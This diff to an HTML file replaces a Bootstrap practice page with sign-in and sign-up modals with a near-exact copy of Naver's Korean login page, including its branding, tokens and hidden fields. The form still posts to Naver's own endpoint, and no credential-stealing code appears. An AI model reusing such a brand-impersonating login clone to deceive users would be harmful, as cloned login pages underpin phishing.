@@ -1,171 +1,216 @@
 <!doctype html>
 <html lang="ko">
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Project Test</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
-    <style type="text/css">
-    	
-
-    </style>
+    <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="[네이버: 로그인]">
+    <meta property="og:description" content="안전한 로그인을 위해 주소창의 URL과 자물쇠 마크를 확인하세요!">
+    <meta property="og:image" content="https://ssl.pstatic.net/sstatic/search/common/og_v3.png">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="1200">
+    <title>네이버 : 로그인</title>
+    <link rel="stylesheet" type="text/css" href="/login/css/global/desktop/w_20220216.css?20210812">
+    <script type="text/javascript" src="https://ssl.pstatic.net/tveta/libs/glad/prod/2.3.0/gfp-sdk.js" async="" charset="utf-8"></script>
+    <script type="text/javascript" src="https://ssl.pstatic.net/tveta/libs/glad/prod/2.3.0/gfp-ext-nda.js" async="" charset="utf-8"></script>
+    <link href="./style.css" rel="stylesheet" type="text/css"> 
 </head>
+
 <body>
-    <!-- start -->
+    <div id="wrap" class="wrap">
+        <div class="u_skip"><a href="https://www.naver.com">본문 바로가기</a></div>
+        <header class="header" role="banner">
+            <div class="header_inner">
+                <a href="https://www.naver.com" class="logo">
+                    <h1 class="blind">NAVER</h1>
+                </a>
+                <div class="lang" id="show_locale_switch">
+                    <select id="locale_switch" name="locale_switch" title="언어선택" class="sel">
+                        <option value="ko_KR">한국어</option>
+                        <option value="en_US">English</option>
+                        <option value="zh-Hans_CN">中文(简体)</option>
+                        <option value="zh-Hant_TW">中文(台灣)</option>
+                    </select>
+                </div>
+            </div>
+        </header>
     
-    <form class="" method="get" action="#" id="form">
-        <nav class="navbar navbar-expand-lg bg-light">
-            <div class="container-fluid">
-                <a class="navbar-brand" href="#">Navbar</a>
-                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-                    <span class="navbar-toggler-icon"></span>
-                </button>
-                <div class="collapse navbar-collapse" id="navbarSupportedContent">
-                    <ul class="navbar-nav me-auto mb-2 mb-lg-0">
-                        <li class="nav-item">
-                            <a class="nav-link active" aria-current="page" href="#">Home</a>
+        <div id="container" class="container">
+            <!-- content -->
+            <div class="content">
+                <div class="login_wrap">
+                    <ul class="menu_wrap" role="tablist">
+                        <li class="menu_item" role="presentation">
+                            <!--[주] 탭메뉴 활성화시(=선택시) "on"을 추가해주세요. 접근성: aria-selected는 탭 선택시 true, 미선택시 false로 적용-->
+                            <!--[주:접근성] 탭메뉴의 id 값과 탭내용의 aria-controls를 연결하고 있습니다. -->
+                            <a href="#none" id="loinid" class="menu_id on" role="tab" aria-selected="true">
+                                <span class="menu_text"><span class="text">ID 로그인</span></span>
+                            </a>
                         </li>
-                        <li class="nav-item">
-                            <a class="nav-link" href="#">Link</a>
+                        <li class="menu_item" role="presentation">
+                            <a href="#none" id="ones" class="menu_ones" role="tab" aria-selected="false">
+                                <span class="menu_text"><span class="text">일회용 번호</span></span>
+                            </a>
                         </li>
-                        <li>
-                            <button class="btn" href="#exampleModalToggle" type="button" data-bs-toggle="modal" aria-haspopup="true" aria-expanded="false">Sign In</button>
-                            <div class="modal fade" id="exampleModalToggle" aria-hidden="true" aria-labelledby="exampleModalToggleLabel" tabindex="-1">
-                                <div class="modal-dialog modal-dialog-centered">
-                                    <div class="modal-content">
-                                        <div class="modal-header">
-                                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-                                        </div>
-                                        <div class="modal-body">
-                                            <p class="fs-2 modal-title fw-bold text-center" id="exampleModalToggleLabel">Sign In</p>
-                                            <div class="mb-3 text-center">
-                                                Don't have an account yet? <a role="button" data-bs-target="#exampleModalToggle2" href="#exampleModalToggle2" data-bs-toggle="modal">Sign up here</a>
-                                            </div>
-                                            <div class="mb-3">
-                                                <label for="user_id" class="form-label">Id</label>
-                                                <input type="text" class="form-control shadow" id="user_id" value="" placeholder="Enter ID" required>
-                                            </div>
-                                            <div class="mb-3">
-                                                <label for="user_pw" class="form-label">Password</label>
-                                                <input type="text" class="form-control shadow" id="user_pw" value="" placeholder="Enter ID" required>
-                                            </div>
-                                            <div class="d-grid mb-3">
-                                                <button class="btn btn-success" type="submit">Sing In</button>
-                                            </div>
-                                        </div>
-                                        <div class="modal-footer">
-                                            <button class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
-                                            <button class="btn btn-primary"  data-bs-toggle="modal">로그인</button>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                            
-                        </li>
-                        <li>
-                            <button class="btn" data-bs-target="#exampleModalToggle2" type="button" data-bs-toggle="modal" aria-haspopup="true" aria-expanded="false">Sign Up</button>
-                            <div class="modal fade" id="exampleModalToggle2" aria-hidden="true" aria-labelledby="exampleModalToggleLabel2" tabindex="-1">
-                                <div class="modal-dialog modal-dialog-centered">
-                                    <div class="modal-content">
-                                        <div class="modal-header">
-                                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-                                        </div>
-                                        <div class="modal-body">
-                                            <p class="fs-2 modal-title fw-bold text-center" id="exampleModalToggleLabel">Sign Up</p>
-                                            <div class="mb-3 text-center">
-                                                Already have an account? <a role="button" data-bs-target="#exampleModalToggle" href="#exampleModalToggle" data-bs-toggle="modal">Log in here</a>
-                                            </div>
-                                            <div class="mb-3">
-                                                <label for="name" class="form-label fw-bold">Id</label>
-                                                <input type="text" class="form-control" id="name" value="" required>
-                                            </div>
-                                            <div class="mb-3">
-                                                <label for="id" class="form-label fw-bold">Password</label>
-                                                <input type="text" class="form-control" id="id" value="" required>
-                                            </div>
-                                            <div class="mb-3">
-                                                <label for="password" class="form-label">Password</label>
-                                                <input type="password" class="form-control" id="password" value="" placeholder="8+ characters required" required>
-                                            </div>
-                                            <div class="mb-3">
-                                                <label for="confirm_pw" class="form-label fw-bold">Confirm Password</label>
-                                                <input type="password" class="form-control" id="confirm_pw" value="" placeholder="8+ characters required" required>
-                                            </div>
-                                            <div class="mb-3">
-                                                <label for="email" class="form-label fw-bold">Email</label>
-                                                <input type="email" class="form-control" id="email" value="" placeholder="email@gmail.com" required>
-                                            </div>
-                                            <div class="mb-3">
-                                                <label for="gender" class="form-label fw-bold">성별</label>
-                                                <select class="form-select" id="gender" aria-label="Default select example">
-                                                    <option selected>선택</option>
-                                                    <option value="남성">남성</option>
-                                                    <option value="여성">여성</option>
-                                                </select>
-                                            </div>
-                                            <div class="mb-3">
-                                                <label for="dob" class="form-label fw-bold">생년월일</label>
-                                                <input type="text" class="form-control" id="dob" value="" required>
-                                            </div>
-                                            <div class="mb-3">
-                                                <label for="tel" class="form-label fw-bold">Phone</label>
-                                                <input type="tel" class="form-control" id="tel" value="" required>
-                                            </div>
-                                            <div class="mb-3">
-                                                <label for="zipCode" class="form-label fw-bold">우편번호</label>
-                                                <input type="text" class="form-control" id="zipCOde" value="" required>
-                                            </div>
-                                            <div class="mb-3">
-                                                <label for="address" class="form-label fw-bold">주소</label>
-                                                <input type="text" class="form-control" id="address" value="" required>
-                                            </div>
-                                            <div class="mb-3">
-                                                <label for="detailAddress" class="form-label fw-bold">상세주소</label>
-                                                <input type="text" class="form-control" id="detailAddress" value="" required>
-                                            </div>
-                                            <div class="mb-3">
-                                                <label for="team" class="form-label fw-bold">좋아하는 팀</label>
-                                                <input type="text" class="form-control" id="team" value="" required>
-                                            </div>
-                                            <hr>
-                                            <p class="fs-4 modal-title fw-bold text-center">선택 사항</p>
-                                            <div class="mb-3">
-                                                <label for="job" class="form-label fw-bold">Job</label>
-                                                <select class="form-select" id="job" aria-label="Default select example">
-                                                    <option selected>선택</option>
-                                                    <option value="학생">학생</option>
-                                                    <option value="회사원">회사원</option>
-                                                    <option value="기타">기타</option>
-                                                </select>
-                                            </div>
-                                            <div class="d-grid mb-3">
-                                                <button class="btn btn-success" type="submit">Sign Up</button>
-                                            </div>
-                                        </div>
-                                        <div class="modal-footer">
-                                            <button class="btn btn-primary" data-bs-target="#exampleModalToggle" data-bs-toggle="modal">Back to first</button>
-                                        </div>
-                                    </div>
-                                </div>
+                        <li class="menu_item" role="presentation">
+                            <a href="#none" id="qrcode" class="menu_qr" role="tab" aria-selected="false">
+                                <span class="menu_text"><span class="text">QR코드</span></span>
+                            </a>
+                            <!--넛지배너-->
+                            <div class="nudge_banner" id="nudge_tooltip">
+                                <span class="nudge_text">PC방 등 공용PC라면 QR코드 로그인이 더 안전해요.</span>
+                                <button type="button" id="nudge_close" class="nudge_close"><span class="icon_nudge_close"></span></button>
                             </div>
                         </li>
                     </ul>
-                    <form class="d-flex" role="search">
-                    <input class="form-control me-2" type="search" placeholder="Search" aria-label="Search">
-                    <button class="btn btn-outline-success" type="submit">Search</button>
+                    <form id="frmNIDLogin" name="frmNIDLogin" target="_top" autocomplete="off" action="https://nid.naver.com/nidlogin.login" method="POST">
+                        <input type="hidden" id="localechange" name="localechange" value="">
+                        <input type="hidden" name="dynamicKey" id="dynamicKey" value="xbUqT77sjxWlGcz3-wSTtRU2PgKxDwlKPuGdreLSQa2ODSeF2q_QDlPVKiVPhtWn0hINXpRY2LZl4ja1Ms6ekOMoB2BQgjDkmcs9Rd2KVCw">
+                        <input type="hidden" name="encpw" id="encpw" value="">
+    <input type="hidden" name="enctp" id="enctp" value="1">
+    <input type="hidden" name="svctype" id="svctype" value="1">
+    <input type="hidden" name="smart_LEVEL" id="smart_LEVEL" value="1">
+    <input type="hidden" name="bvsd" id="bvsd" value="">
+    <input type="hidden" name="encnm" id="encnm" value="">
+    <input type="hidden" name="locale" id="locale" value="ko_KR">
+    <input type="hidden" name="url" id="url" value="https://www.naver.com">
+    
+    
+                        <ul class="panel_wrap">
+                            <li class="panel_item" style="display: block;">
+                                <div class="panel_inner" role="tabpanel" aria-controls="loinid">
+                                    <div class="id_pw_wrap">
+                                        <div class="input_row" id="id_line">
+                                            <div class="icon_cell" id="id_cell">
+                                                <span class="icon_id">
+                                                    <span class="blind">아이디</span>
+                                                </span>
+                                            </div>
+                                            <input type="text" id="id" name="id" placeholder="아이디" title="아이디" class="input_text" maxlength="41" value="">
+                                            <span role="button" class="btn_delete" id="id_clear" style="display: none;">
+                                                <span class="icon_delete">
+                                                    <span class="blind">삭제</span>
+                                                </span>
+                                            </span>
+                                        </div>
+                                        <div class="input_row" id="pw_line">
+                                            <div class="icon_cell" id="pw_cell">
+                                                <span class="icon_pw">
+                                                    <span class="blind">비밀번호</span>
+                                                </span>
+                                            </div>
+                                            <input type="password" id="pw" name="pw" placeholder="비밀번호" title="비밀번호" class="input_text" maxlength="16">
+                                            <span role="button" class="btn_delete" id="pw_clear" style="display: none;">
+                                                <span class="icon_delete">
+                                                    <span class="blind">삭제</span>
+                                                </span>
+                                            </span>
+                                        </div>
+                                    </div>
+                                    <div class="login_keep_wrap" id="login_keep_wrap">
+                                        <div class="keep_check">
+                                            <input type="checkbox" id="keep" name="nvlong" class="input_keep" value="off">
+                                            <label for="keep" class="keep_text">로그인 상태 유지</label>
+                                        </div>
+                                        <div class="ip_check">
+                                            <a href="/login/ext/help_ip3.html" target="_blank" id="ipguide" title="IP보안"><span class="ip_text">IP보안</span></a>
+                                            <span class="switch">
+                                                <input type="checkbox" id="switch" class="switch_checkbox" value="off">
+                                                <label for="switch" class="switch_btn">
+                                                    <span class="blind" id="switch_blind">on</span>
+                                                </label>
+                                            </span>
+                                        </div>
+                                    </div>
+    
+                                    <div class="login_error_wrap" id="err_capslock" style="display: none;">
+                                        <div class="error_message">
+                                            <strong>CapsLock</strong>이 켜져 있습니다.
+                                        </div>
+                                    </div>
+    
+                                    <div class="login_error_wrap" id="err_empty_id" style="display: none;">
+                                        <div class="error_message">
+                                            <strong>아이디</strong>를 입력해 주세요.
+                                        </div>
+                                    </div>
+    
+                                    <div class="login_error_wrap" id="err_empty_pw" style="display: none;">
+                                        <div class="error_message">
+                                            <strong>비밀번호</strong>를 입력해 주세요.
+                                        </div>
+                                    </div>
+                                    <div class="login_error_wrap" id="err_common" style="display:none;">
+                                        <div class="error_message" style="width:90%">
+                                            
+                                        </div>
+                                    </div>
+                                    <div class="btn_login_wrap">
+    
+                                        <button type="submit" class="btn_login" id="log.login">
+                                            <span class="btn_text">로그인</span>
+                                        </button>
+    
+                                    </div>
+                                </div>
+                            </li>
+                        </ul>
                     </form>
                 </div>
-            </div>
-        </nav>
-       
-    </form>
+                <ul class="find_wrap" id="find_wrap">
     
-
-    <!-- end -->
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>
-	<script src="https://kit.fontawesome.com/1d32d56af5.js" crossorigin="anonymous"></script>
-    <script type="text/javascript">
-    	
-    </script>
+                    <li><a target="_blank" href="https://nid.naver.com/user2/api/route?m=routePwInquiry&amp;lang=ko_KR" class="find_text">비밀번호 찾기</a></li>
+                    <li><a target="_blank" href="https://nid.naver.com/user2/api/route?m=routeIdInquiry&amp;lang=ko_KR" class="find_text">아이디 찾기</a></li>
+                    <li><a target="_blank" href="https://nid.naver.com/user2/V2Join?m=agree&amp;lang=ko_KR" class="find_text">회원가입</a>
+                    </li>
+    
+                </ul>
+                <!--배너-->
+                <div id="gladbanner" class="banner_wrap"><div style="width: 100%; height: auto; margin: 0px auto;"><iframe id="gladbanner_tgtLREC" frameborder="no" scrolling="no" tabindex="-1" name="" title="AD" style="width: 100%; height: 21px; visibility: inherit; display: block; border: 0px; vertical-align: bottom;" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" src="https://ssl.pstatic.net/tveta/libs/glad/prod/2.3.0/res/r.html"></iframe></div></div>
+            </div>
+            <!-- //content -->
+        </div>
+    
+        <!-- footer -->
+        <div class="footer">
+            <div class="footer_inner">
+                <!--[주]고객센터,제휴문의,서비스안내-->
+                <ul class="footer_link" id="footer_link">
+                    <li><a target="_blank" class="footer_item" href="http://www.naver.com/rules/service.html" id="fot.agreement"><span class="text">이용약관</span></a></li>
+                    <li><a target="_blank" class="footer_item" href="http://www.naver.com/rules/privacy.html" id="fot.privacy"><span class="text"><strong>개인정보처리방침</strong></span></a></li>
+                    <li><a target="_blank" class="footer_item" href="http://www.naver.com/rules/disclaimer.html" id="fot.disclaimer"><span class="text">책임의 한계와 법적고지</span></a></li>
+                    <li><a target="_blank" class="footer_item" href="https://help.naver.com/support/service/main.nhn?serviceNo=532" id="fot.help"><span class="text">회원정보 고객센터</span></a></li>
+                </ul>
+                <div class="footer_copy">
+                    <a id="fot.naver" target="_blank" href="https://www.navercorp.com">
+                        <span class="footer_logo"><span class="blind">네이버</span></span>
+                    </a>
+                    <span class="text">Copyright</span>
+                    <span class="corp">© NAVER Corp.</span>
+                    <span class="text">All Rights Reserved.</span>
+                </div>
+            </div>
+        </div>
+    
+    </div>
+    <input type="hidden" id="nclicks_nsc" name="nclicks_nsc" value="nid.login_kr">
+    <input type="hidden" id="nid_buk" name="nid_buk" value="exist">
+    <input type="hidden" id="removeLink" name="removeLink" value="">
+    <input type="hidden" id="hide_util" name="hide_util" value="">
+    <input type="hidden" id="ncaptchaSplit" name="ncaptchaSplit" value="none">
+    <input type="hidden" id="id_error_msg" name="id_error_msg" value="<strong>아이디</strong>를 입력해주세요.">
+    <input type="hidden" id="pw_error_msg" name="pw_error_msg" value="<strong>비밀번호</strong>를 입력해주세요.">
+    <input type="hidden" id="locale" name="locale" value="ko_KR">
+    <input type="hidden" id="adult_surl_v2" name="adult_surl_v2" value="">
+    <input type="hidden" id="ispopup" name="ispopup" value="false">
+    <script type="text/javascript" src="/login/js/bvsd.1.3.5.min.js"></script>
+    <script type="text/javascript" async="" src="https://ssl.pstatic.net/tveta/libs/glad/prod/gfp-core.js"></script>
+    <script type="text/javascript" src="/login/js/v2/default/common_202201.js?v=20220322"></script>
+    <script type="text/javascript" src="/login/js/v2/default/default_202105.js?v=20210910"></script>
+    <div id="nv_stat" style="display:none;">20</div>
+    
+    
 </body>
 </html>
